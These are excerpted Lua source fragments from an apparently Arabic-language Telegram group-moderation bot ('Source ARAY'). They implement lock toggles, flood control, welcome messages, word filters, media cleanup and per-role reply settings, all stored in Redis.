DevRio:set("ARAY:New:id:"..ARAY..msg.chat_id_..msg.sender_user_id_,'ARAYTeam')
return "ARAYTeam"
end
if text and Manager(msg) and DevRio:get("ARAY:New:id:"..ARAY..msg.chat_id_..msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙تم الغاء حفظ كليشة الايدي', 1, 'md')
DevRio:del("ARAY:New:id:"..ARAY..msg.chat_id_..msg.sender_user_id_)
return false
end
DevRio:del("ARAY:New:id:"..ARAY..msg.chat_id_..msg.sender_user_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙تم حفظ الكليشه الجديده', 1, 'md')
DevRio:set(ARAY.."Rio:GpIds:Text"..msg.chat_id_,text)
return false
end
if text and text:match("^حذف الايدي$") and ChCheck(msg) or text and text:match("^مسح الايدي$") and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","↯︙تم حذف كليشة الايدي")  
DevRio:del(ARAY.."Rio:GpIds:Text"..msg.chat_id_)
end
end
--     Source ARAY     --
if msg.reply_to_message_id_ ~= 0 then
...
function ARAYTeam(extra,rio,success)
...
local msgsday = DevRio:get(ARAY..'Rio:UsersMsgs'..ARAY..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local edit_msg = DevRio:get(ARAY..'Rio:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevRio:get(ARAY..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local user_nkt = tonumber(DevRio:get(ARAY..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)
local cont = (tonumber(DevRio:get(ARAY..'Rio:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
...
if not DevRio:get(ARAY..'Rio:Lock:Id'..msg.chat_id_) then 
if not DevRio:get(ARAY..'Rio:Lock:Id:Photo'..msg.chat_id_) then 
if DevRio:get(ARAY.."Rio:AllIds:Text") then
newpicid = DevRio:get(ARAY.."Rio:AllIds:Text")
...
if not DevRio:get(ARAY.."Rio:GpIds:Text"..msg.chat_id_) then 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, rio.photos_[0].sizes_[1].photo_.persistent_id_,newpicid,msg.id_,msg.id_.."")
else 
local new_id = DevRio:get(ARAY.."Rio:GpIds:Text"..msg.chat_id_)
...
if DevRio:get(ARAY.."Rio:AllIds:Text") then
newallid = DevRio:get(ARAY.."Rio:AllIds:Text")
...
if DevRio:get(ARAY.."Rio:AllIds:Text") then
notpicid = DevRio:get(ARAY.."Rio:AllIds:Text")
...
if not DevRio:get(ARAY..'Rio:Lock:EditMsgs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","↯︙تم قفل التعديل")  
DevRio:set(ARAY..'Rio:Lock:EditMsgs'..msg.chat_id_,true)
else
...
DevRio:set(ARAY.."Rio:Lock:Bots"..msg.chat_id_,"ked")  
end
if LockText[2] == "التكرار" or LockText[2] == "التكرار بالحذف" then 
DevRio:hset(ARAY.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User","del")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","↯︙تم قفل التكرار بالحذف")  
end
if LockText[2] == "التكرار بالطرد" then 
DevRio:hset(ARAY.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User","kick")  
...
DevRio:hset(ARAY.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","↯︙تم قفل التكرار بالتقيد")  
end
if LockText[2] == "التكرار بالكتم" then 
DevRio:hset(ARAY.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User","mute")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","↯︙تم قفل التكرار بالكتم")  
end
if BasicConstructor(msg) then
if LockText[2] == "التثبيت" then
if not DevRio:get(ARAY..'Rio:Lock:Pin'..msg.chat_id_) then
tdcli_function ({ ID = "GetChannelFull",  channel_id_ = msg.chat_id_:gsub("-100","") }, function(arg,data)  DevRio:set(ARAY.."Rio:PinnedMsg"..msg.chat_id_,data.pinned_message_id_)  end,nil)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","↯︙تم قفل التثبيت")  
DevRio:set(ARAY..'Rio:Lock:Pin'..msg.chat_id_,true)
DevRio:sadd(ARAY.."Rio:Lock:Pinpin",msg.chat_id_) 
else
...
DevRio:hset(ARAY.."Rio:Spam:Group:User"..msg.chat_id_ ,"Num:Spam" ,TextSpam) 
end
end
if text and (text:match("^ضع زمن التكرار (%d+)$") or text:match("^وضع زمن التكرار (%d+)$")) then  
local TextSpam = text:match("ضع زمن التكرار (%d+)$") or text:match("وضع زمن التكرار (%d+)$")
DevRio:hset(ARAY.."Rio:Spam:Group:User"..msg.chat_id_ ,"Num:Spam:Time" ,TextSpam) 
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(ARAY..'Rio:Lock:Id:Photo'..msg.chat_id_)
end end
if text and text == 'تعطيل الايدي بالصوره' and ChCheck(msg) then
if DevRio:get(ARAY..'Rio:Lock:Id:Photo'..msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙الايدي بالصوره بالتاكيد معطل', 1, 'md')
else
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙تم تعطيل الايدي بالصوره'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(ARAY..'Rio:Lock:Id:Photo'..msg.chat_id_,true)
end end 
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(ARAY..'Rio:Lock:Id'..msg.chat_id_)
end end 
if text and text == 'تعطيل الايدي' and ChCheck(msg) then
if DevRio:get(ARAY..'Rio:Lock:Id'..msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙الايدي بالتاكيد معطل ', 1, 'md')
else
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙تم تعطيل الايدي بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(ARAY..'Rio:Lock:Id'..msg.chat_id_,true)
end end
end
--     Source ARAY     --
...
DevRio:setex(ARAY.."Rio:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_,300,true) 
end
if text == 'انشاء رابط' and ChCheck(msg) or text == 'انشاء الرابط' and ChCheck(msg) then
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if not DevRio:get(ARAY.."Rio:Groups:Links"..msg.chat_id_)  then 
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
DevRio:set(ARAY.."Rio:Groups:Links"..msg.chat_id_,LinkGroup) 
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(ARAY.."Rio:Lock:Welcome"..msg.chat_id_,true)
end
if text and text:match("^تعطيل الترحيب$") and ChCheck(msg) then
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙تم تعطيل الترحيب بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(ARAY.."Rio:Lock:Welcome"..msg.chat_id_)
end
if DevRio:get(ARAY..'Rio:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_) then 
if text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙تم الغاء حفظ كليشة الترحيب', 1, 'md')
DevRio:del(ARAY..'Rio:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
DevRio:del(ARAY..'Rio:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_)
Welcomes = text:gsub('"',"") Welcomes = text:gsub("'","") Welcomes = text:gsub(",","") Welcomes = text:gsub("*","") Welcomes = text:gsub(";","") Welcomes = text:gsub("`","") Welcomes = text:gsub("{","") Welcomes = text:gsub("}","") 
DevRio:set(ARAY..'Rio:Groups:Welcomes'..msg.chat_id_,Welcomes)
...
DevRio:set(ARAY..'Rio:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
if text and text:match("^حذف الترحيب$") and ChCheck(msg) or text and text:match("^حذف ترحيب$") and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","↯︙تم حذف الترحيب")  
DevRio:del(ARAY..'Rio:Groups:Welcomes'..msg.chat_id_)
end
if text and text:match("^جلب الترحيب$") and ChCheck(msg) or text and text:match("^جلب ترحيب$") and ChCheck(msg) or text and text:match("^الترحيب$") and ChCheck(msg) then
local Welcomes = DevRio:get(ARAY..'Rio:Groups:Welcomes'..msg.chat_id_)
if Welcomes then
Dev_Rio(msg.chat_id_, msg.id_, 1, Welcomes, 1, 'md')
else
...
--     Source ARAY     --
if DevRio:get(ARAY..'Rio:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_) then  
if text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "↯︙تم الغاء حفظ الوصف", 1, 'md')
DevRio:del(ARAY..'Rio:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
DevRio:del(ARAY..'Rio:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
...
DevRio:set(ARAY..'Rio:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_,true)
...
DevRio:set(ARAY.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_,"add")  
return false  
end    
if DevRio:get(ARAY.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_) == "add" then
if text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙تم الغاء امر المنع', 1, 'md')
DevRio:del(ARAY.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
return false  
end   
Dev_Rio(msg.chat_id_, msg.id_, 1, "↯︙تم منع الكلمه ↫ "..text, 1, 'html')
DevRio:del(ARAY.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
DevRio:hset(ARAY..'Rio:Filters:'..msg.chat_id_, text,'newword')
return false
end
if text and text == "الغاء منع" and msg.reply_to_message_id_ == 0 and ChCheck(msg) then       
Dev_Rio(msg.chat_id_, msg.id_, 1, "↯︙ارسل لي الكلمه الان", 1, 'md') 
DevRio:set(ARAY.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_,"del")  
return false  
end    
if DevRio:get(ARAY.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_) == "del" then   
if text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙تم الغاء امر الغاء المنع', 1, 'md')
DevRio:del(ARAY.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
return false  
end   
if not DevRio:hget(ARAY..'Rio:Filters:'..msg.chat_id_, text) then  
Dev_Rio(msg.chat_id_, msg.id_, 1, "↯︙الكلمه ↫ "..text.." غير ممنوعه", 1, 'html')
DevRio:del(ARAY.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
else
DevRio:hdel(ARAY..'Rio:Filters:'..msg.chat_id_, text)
...
local gps = DevRio:scard(ARAY.."Rio:Groups") local users = DevRio:scard(ARAY.."Rio:Users") 
...
local users = DevRio:scard(ARAY.."Rio:Users")
...
local gps = DevRio:scard(ARAY.."Rio:Groups")
...
if not DevRio:get(ARAY..'Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_) then  
...
DevRio:setex(ARAY..'Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
end 
end
...
local pv = DevRio:smembers(ARAY.."Rio:Users")
local sendok = 0
for i = 1, #pv do
...
DevRio:srem(ARAY.."Rio:Users",pv[i])
sendok = sendok + 1
end
if #pv == i then 
if sendok == 0 then
...
local group = DevRio:smembers(ARAY.."Rio:Groups")
local w = 0
local q = 0
for i = 1, #group do
tdcli_function({ID='GetChat',chat_id_ = group[i]},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
DevRio:srem(ARAY.."Rio:Groups",group[i]) 
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = group[i], user_id_ = ARAY, status_ = { ID = "ChatMemberStatusLeft" }, }, dl_cb, nil)
w = w + 1
end
...
Dev_Rio(msg.chat_id_, msg.id_, 1,'↯︙عدد الكروبات الان ↫ { '..#group..' }'..ARAYgp1..ARAYgp2..'\n↯︙العدد الحقيقي الان  ↫ ( '..ARAYgp3..' ) \n ', 1, 'md')
end end
end,nil)
end
return false
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(ARAY..'Rio:Lock:CleanNum'..msg.chat_id_,true)  
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(ARAY..'Rio:Lock:CleanNum'..msg.chat_id_) 
end
...
DevRio:set(ARAY..'Rio:CleanNum'..msg.chat_id_,Num) 
end end 
if msg and DevRio:get(ARAY..'Rio:Lock:CleanNum'..msg.chat_id_) then
if DevRio:get(ARAY..'Rio:CleanNum'..msg.chat_id_) then CleanNum = DevRio:get(ARAY..'Rio:CleanNum'..msg.chat_id_) else CleanNum = 200 end
if DevRio:scard(ARAY.."Rio:cleanernum"..msg.chat_id_) >= tonumber(CleanNum) then 
local List = DevRio:smembers(ARAY.."Rio:cleanernum"..msg.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
local Message = v
...
DevRio:del(ARAY.."Rio:cleanernum"..msg.chat_id_)
end 
end
if CleanerNum(msg) then
if DevRio:get(ARAY..'Rio:Lock:CleanNum'..msg.chat_id_) then 
if text == "التلقائي" and ChCheck(msg) or text == "عدد التلقائي" and ChCheck(msg) then 
local M = DevRio:scard(ARAY.."Rio:cleanernum"..msg.chat_id_)
if M ~= 0 then
Dev_Rio(msg.chat_id_, msg.id_, 1, "↯︙عدد الميديا ↫ "..M.."\n↯︙الحذف التلقائي ↫ "..(DevRio:get(ARAY..'Rio:CleanNum'..msg.chat_id_) or 200), 1, 'md') 
else
...
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙تم تفعيل امسح بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(ARAY..'Rio:Lock:Clean'..msg.chat_id_,true)  
end
if text == "تعطيل امسح" and Constructor(msg) then
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙تم تعطيل امسح بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(ARAY..'Rio:Lock:Clean'..msg.chat_id_) 
end
if Cleaner(msg) then
if DevRio:get(ARAY..'Rio:Lock:Clean'..msg.chat_id_) then 
if text == "الميديا" and ChCheck(msg) or text == "عدد الميديا" and ChCheck(msg) then 
local M = DevRio:scard(ARAY.."Rio:cleaner"..msg.chat_id_)
if M ~= 0 then
...
DevRio:del(ARAY.."Rio:cleaner"..msg.chat_id_)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, "↯︙لاتوجد ميديا هنا", 1, 'md') 
end end 
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(ARAY..'Rio:Lock:CleanMusic'..msg.chat_id_,true)  
end
if text == "تعطيل مسح الاغاني" and Constructor(msg) then
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙تم تعطيل مسح الاغاني بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(ARAY..'Rio:Lock:CleanMusic'..msg.chat_id_) 
end
if CleanerMusic(msg) then
if DevRio:get(ARAY..'Rio:Lock:CleanMusic'..msg.chat_id_) then 
if text == "الاغاني" and ChCheck(msg) or text == "عدد الاغاني" and ChCheck(msg) then 
local M = DevRio:scard(ARAY.."Rio:cleanermusic"..msg.chat_id_)
if M ~= 0 then
...
local List = DevRio:smembers(ARAY.."Rio:cleanermusic"..msg.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
local Message = v
...
DevRio:del(ARAY.."Rio:cleanermusic"..msg.chat_id_)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, "↯︙لاتوجد اغاني هنا", 1, 'md') 
end end end end
--     Source ARAY     --
...
if DevRio:get(ARAY..'Rio:Lock:EditMsgs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","↯︙تم فتح التعديل")  
DevRio:del(ARAY..'Rio:Lock:EditMsgs'..msg.chat_id_)
else
...
DevRio:del(ARAY.."Rio:Lock:Bots"..msg.chat_id_)  
end end
if UnLockText[2] == "التكرار" then 
DevRio:hdel(ARAY.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","↯︙تم فتح التكرار")  
end
if BasicConstructor(msg) then
if UnLockText[2] == "التثبيت" then
if DevRio:get(ARAY..'Rio:Lock:Pin'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","↯︙تم فتح التثبيت")  
DevRio:del(ARAY..'Rio:Lock:Pin'..msg.chat_id_)
DevRio:srem(ARAY.."Rio:Lock:Pinpin",msg.chat_id_)
else
...
DevRio:del(ARAY..'Rio:Lock:Text'..msg.chat_id_)
else
...
DevRio:del(ARAY..'Rio:Lock:Photo'..msg.chat_id_)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙الصور بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الكلايش" then
if DevRio:get(ARAY..'Rio:Lock:Spam'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","↯︙تم فتح الكلايش")  
DevRio:del(ARAY..'Rio:Lock:Spam'..msg.chat_id_)
else
...
DevRio:del(ARAY..'Rio:Lock:Join'..msg.chat_id_)
else
...
DevRio:del(ARAY..'Rio:Lock:Videos'..msg.chat_id_)
else
...
DevRio:del(ARAY..'Rio:Lock:Document'..msg.chat_id_)
else
...
DevRio:del(ARAY..'Rio:Lock:Inline'..msg.chat_id_)
else
...
DevRio:del(ARAY..'Rio:Lock:Markdown'..msg.chat_id_)
else
...
DevRio:del(ARAY..'Rio:Lock:Gifs'..msg.chat_id_)
else
...
DevRio:del(ARAY..'Rio:Lock:Music'..msg.chat_id_)
else
...
DevRio:del(ARAY..'Rio:Lock:Voice'..msg.chat_id_)
else
...
DevRio:del(ARAY..'Rio:Lock:Links'..msg.chat_id_)
else
...
DevRio:del(ARAY..'Rio:Lock:Location'..msg.chat_id_)
else
...
DevRio:del(ARAY..'Rio:Lock:Tags'..msg.chat_id_)
else
...
DevRio:del(ARAY..'Rio:Lock:Hashtak'..msg.chat_id_)
else
...
DevRio:del(ARAY..'Rio:Lock:Contact'..msg.chat_id_)
else
...
DevRio:del(ARAY..'Rio:Lock:WebLinks'..msg.chat_id_)
else
...
DevRio:del(ARAY..'Rio:Lock:Arabic'..msg.chat_id_)
else
...
DevRio:del(ARAY..'Rio:Lock:English'..msg.chat_id_)
else
...
DevRio:del(ARAY..'Rio:Lock:TagServr'..msg.chat_id_)
else
...
DevRio:del(ARAY..'Rio:Lock:Stickers'..msg.chat_id_)
else
...
DevRio:del(ARAY..'Rio:Lock:Forwards'..msg.chat_id_)
else
...
DevRio:set(ARAY.."Rio:Lock:Bots"..msg.chat_id_,"del") DevRio:hset(ARAY.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed") 
LockList ={'Rio:Lock:Links','Rio:Lock:Contact','Rio:Lock:Forwards','Rio:Lock:Videos','Rio:Lock:Gifs','Rio:Lock:EditMsgs','Rio:Lock:Stickers','Rio:Lock:Farsi','Rio:Lock:Spam','Rio:Lock:WebLinks','Rio:Lock:Photo'}
for i,Lock in pairs(LockList) do
DevRio:set(ARAY..Lock..msg.chat_id_,true)
end
...
DevRio:del(ARAY..UnLock..msg.chat_id_)
end
...
DevRio:del(ARAY..'Rio:Lock:Fshar'..msg.chat_id_) DevRio:del(ARAY..'Rio:Lock:Taf'..msg.chat_id_) DevRio:del(ARAY..'Rio:Lock:Kfr'..msg.chat_id_) 
DevRio:set(ARAY.."Rio:Lock:Bots"..msg.chat_id_,"del") DevRio:hset(ARAY.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed") 
...
DevRio:set(ARAY..'Rio:Lock:Fshar'..msg.chat_id_,true) DevRio:set(ARAY..'Rio:Lock:Taf'..msg.chat_id_,true) DevRio:set(ARAY..'Rio:Lock:Kfr'..msg.chat_id_,true) DevRio:hdel(ARAY.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User") 
...
DevRio:set(ARAY..'Rio:Spam:Text'..msg.chat_id_,SetSpam)
...
DevRio:set(ARAY.."Rio:SudoBot:Rd"..msg.chat_id_,Text)
...
DevRio:set(ARAY.."Rio:BasicConstructor:Rd"..msg.chat_id_,Text)
...
DevRio:set(ARAY.."Rio:Constructor:Rd"..msg.chat_id_,Text)
...
DevRio:set(ARAY.."Rio:Managers:Rd"..msg.chat_id_,Text) 
...
DevRio:set(ARAY.."Rio:Admins:Rd"..msg.chat_id_,Text)
...
DevRio:set(ARAY.."Rio:VipMem:Rd"..msg.chat_id_,Text)
...
DevRio:set(ARAY.."Rio:Cleaner:Rd"..msg.chat_id_,Text)
...
DevRio:set(ARAY.."Rio:mem:Rd"..msg.chat_id_,Text)
...
DevRio:del(ARAY.."Rio:mem:Rd"..msg.chat_id_)
DevRio:del(ARAY.."Rio:Cleaner:Rd"..msg.chat_id_)
DevRio:del(ARAY.."Rio:VipMem:Rd"..msg.chat_id_)
DevRio:del(ARAY.."Rio:Admins:Rd"..msg.chat_id_)
DevRio:del(ARAY.."Rio:Managers:Rd"..msg.chat_id_)
DevRio:del(ARAY.."Rio:Constructor:Rd"..msg.chat_id_)
DevRio:del(ARAY.."Rio:BasicConstructor:Rd"..msg.chat_id_)
DevRio:del(ARAY.."Rio:SudoBot:Rd"..msg.chat_id_)
end
end
--     Source ARAY     --
...
if tonumber(admins[i].user_id_) ~= tonumber(ARAY) then
...
DevRio:srem(ARAY..'Rio:Tkeed:'..msg.chat_id_, v)
end 
...
DevRio:del(ARAY..'Rio:Filters:'..msg.chat_id_)
DevRio:del(ARAY..'Rio:Filters:'..msg.chat_id_)
DevRio:del(ARAY.."Rio:FilterAnimation"..msg.chat_id_)
DevRio:del(ARAY.."Rio:FilterPhoto"..msg.chat_id_)
DevRio:del(ARAY.."Rio:FilterSteckr"..msg.chat_id_)
end
...
DevRio:del(ARAY..'Rio:Ban:'..msg.chat_id_) DevRio:del(ARAY..'Rio:Admins:'..msg.chat_id_) DevRio:del(ARAY..'User:Donky:'..msg.chat_id_) DevRio:del(ARAY..'Rio:VipMem:'..msg.chat_id_) DevRio:del(ARAY..'Rio:Filters:'..msg.chat_id_) DevRio:del(ARAY..'Rio:Muted:'..msg.chat_id_)
...
local basicconstructor = DevRio:smembers(ARAY..'Rio:BasicConstructor:'..msg.chat_id_)
local constructor = DevRio:smembers(ARAY..'Rio:Constructor:'..msg.chat_id_)
local Managers = DevRio:smembers(ARAY..'Rio:Managers:'..msg.chat_id_)
local admins = DevRio:smembers(ARAY..'Rio:Admins:'..msg.chat_id_)
local vipmem = DevRio:smembers(ARAY..'Rio:VipMem:'..msg.chat_id_)
local donky = DevRio:smembers(ARAY..'User:Donky:'..msg.chat_id_)
...
spam_c = DevRio:get(ARAY..'Rio:Spam:Text'..msg.chat_id_)
end
--     Source ARAY     --
if DevRio:hget(ARAY.."Rio:Spam:Group:User"..msg.chat_id_, "Spam:User") == "kick" then     
flood = "بالطرد"     
elseif DevRio:hget(ARAY.."Rio:Spam:Group:User"..msg.chat_id_,"Spam:User") == "keed" then     
flood = "بالتقيد"     
elseif DevRio:hget(ARAY.."Rio:Spam:Group:User"..msg.chat_id_,"Spam:User") == "mute" then     
flood = "بالكتم"           
elseif DevRio:hget(ARAY.."Rio:Spam:Group:User"..msg.chat_id_,"Spam:User") == "del" then     
flood = "بالحذف"
else     
flood = "مفتوح"     
end
--     Source ARAY     --
if DevRio:get(ARAY.."Rio:Lock:Bots"..msg.chat_id_) == "del" then
lock_bots = "بالحذف"
elseif DevRio:get(ARAY.."Rio:Lock:Bots"..msg.chat_id_) == "ked" then
lock_bots = "بالتقيد"   
elseif DevRio:get(ARAY.."Rio:Lock:Bots"..msg.chat_id_) == "kick" then
lock_bots = "بالطرد"    
else
lock_bots = "مفتوحه"    
end
--     Source ARAY     --
if DevRio:get(ARAY..'Rio:Lock:Text'..msg.chat_id_) then mute_text = 'مقفله' else mute_text = 'مفتوحه'end
if DevRio:get(ARAY..'Rio:Lock:Photo'..msg.chat_id_) then mute_photo = 'مقفله' else mute_photo = 'مفتوحه' end
if DevRio:get(ARAY..'Rio:Lock:Videos'..msg.chat_id_) then mute_video = 'مقفله' else mute_video = 'مفتوحه' end
if DevRio:get(ARAY..'Rio:Lock:Gifs'..msg.chat_id_) then mute_gifs = 'مقفله' else mute_gifs = 'مفتوحه' end
if DevRio:get(ARAY..'Rio:Lock:Music'..msg.chat_id_) then mute_music = 'مقفله' else mute_music = 'مفتوحه' end
if DevRio:get(ARAY..'Rio:Lock:Inline'..msg.chat_id_) then mute_in = 'مقفله' else mute_in = 'مفتوحه' end
if DevRio:get(ARAY..'Rio:Lock:Voice'..msg.chat_id_) then mute_voice = 'مقفله' else mute_voice = 'مفتوحه' end
if DevRio:get(ARAY..'Rio:Lock:EditMsgs'..msg.chat_id_) then mute_edit = 'مقفله' else mute_edit = 'مفتوحه' end
if DevRio:get(ARAY..'Rio:Lock:Links'..msg.chat_id_) then mute_links = 'مقفله' else mute_links = 'مفتوحه' end
if DevRio:get(ARAY..'Rio:Lock:Pin'..msg.chat_id_) then lock_pin = 'مقفله' else lock_pin = 'مفتوحه' end
if DevRio:get(ARAY..'Rio:Lock:Stickers'..msg.chat_id_) then lock_sticker = 'مقفله' else lock_sticker = 'مفتوحه' end
if DevRio:get(ARAY..'Rio:Lock:TagServr'..msg.chat_id_) then lock_tgservice = 'مقفله' else lock_tgservice = 'مفتوحه' end
if DevRio:get(ARAY..'Rio:Lock:WebLinks'..msg.chat_id_) then lock_wp = 'مقفله' else lock_wp = 'مفتوحه' end
if DevRio:get(ARAY..'Rio:Lock:Hashtak'..msg.chat_id_) then lock_htag = 'مقفله' else lock_htag = 'مفتوحه' end
if DevRio:get(ARAY..'Rio:Lock:Tags'..msg.chat_id_) then lock_tag = 'مقفله' else lock_tag = 'مفتوحه' end
if DevRio:get(ARAY..'Rio:Lock:Location'..msg.chat_id_) then lock_location = 'مقفله' else lock_location = 'مفتوحه' end
if DevRio:get(ARAY..'Rio:Lock:Contact'..msg.chat_id_) then lock_contact = 'مقفله' else lock_contact = 'مفتوحه' end
if DevRio:get(ARAY..'Rio:Lock:English'..msg.chat_id_) then lock_english = 'مقفله' else lock_english = 'مفتوحه' end
if DevRio:get(ARAY..'Rio:Lock:Arabic'..msg.chat_id_) then lock_arabic = 'مقفله' else lock_arabic = 'مفتوحه' end
if DevRio:get(ARAY..'Rio:Lock:Forwards'..msg.chat_id_) then lock_forward = 'مقفله' else lock_forward = 'مفتوحه' end
if DevRio:get(ARAY..'Rio:Lock:Document'..msg.chat_id_) then lock_file = 'مقفله' else lock_file = 'مفتوحه' end
if DevRio:get(ARAY..'Rio:Lock:Markdown'..msg.chat_id_) then markdown = 'مقفله' else markdown = 'مفتوحه' end
if DevRio:get(ARAY..'Rio:Lock:Spam'..msg.chat_id_) then lock_spam = 'مقفله' else lock_spam = 'مفتوحه' end
if DevRio:get(ARAY..'Rio:Lock:Join'..msg.chat_id_) then lock_Join = 'مقفل' else lock_Join = 'مفتوح' end
if DevRio:get(ARAY.."Rio:Lock:Welcome"..msg.chat_id_) then send_welcome = 'مقفله' else send_welcome = 'مفتوحه' end
if DevRio:get(ARAY..'Rio:Lock:Fshar'..msg.chat_id_) then lock_fshar = 'مفتوح' else lock_fshar = 'مقفل' end
if DevRio:get(ARAY..'Rio:Lock:Kfr'..msg.chat_id_) then lock_kaf = 'مفتوح' else lock_kaf = 'مقفل' end
if DevRio:get(ARAY..'Rio:Lock:Taf'..msg.chat_id_) then lock_taf = 'مفتوحه' else lock_taf = 'مقفله' end
if DevRio:get(ARAY..'Rio:Lock:Farsi'..msg.chat_id_) then lock_farsi = 'مقفله' else lock_farsi = 'مفتوحه' end
local Flood_Num = DevRio:hget(ARAY.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5
--     Source ARAY     --
...
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙تم تفعيل ميزة انطق'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(ARAY..'Rio:Antk:Rio'..msg.chat_id_) 
end
if text == "تعطيل انطق" and Manager(msg) and ChCheck(msg) then
